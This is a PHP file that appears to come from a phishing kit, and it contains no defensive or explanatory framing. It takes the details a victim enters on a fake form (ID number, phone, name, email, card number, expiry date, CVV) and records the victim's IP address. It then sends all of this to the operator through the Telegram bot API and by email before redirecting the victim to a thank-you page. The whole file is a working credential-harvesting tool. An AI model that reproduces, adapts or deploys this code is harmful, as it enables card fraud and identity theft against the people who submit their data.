<?php
include("config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "ID Number       : ".$_POST['submitenter']."-".$_POST['id']."\n";
$bilsmg .= "Phone       : ".$_POST['selectprefix']."-".$_POST['nocphone2']."\n";
$bilsmg .= "User Name        : ".$_POST['name']."\n";
$bilsmg .= "Email        : ".$_POST['em1']."\n";
$bilsmg .= "C-Number      : ".$_POST['ccnn1']."\n";
$bilsmg .= "D-Expiration  : ".$_POST['cexppdm']." / ".$_POST['cexdyyyyss']."\n";
$bilsmg .= "CVV           : ".$_POST['qsdq21sd5s4d4s1']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "Jex404 Israel CC :) - ".$ip;
$bilhead = "From: 💌Salem JeX💌 <send@norgepost.io>";
if(!empty($_POST['qsdq21sd5s4d4s1']) && strlen($_POST['qsdq21sd5s4d4s1'])>2){
@file_get_contents("https://api.telegram.org/bot".$botName."/sendMessage?chat_id=".$chatID."&text=".urlencode($bilsmg)); 
@mail($yourEmail,$bilsub,$bilsmg,$bilhead);
}
header("Location: thankyou.html");
?>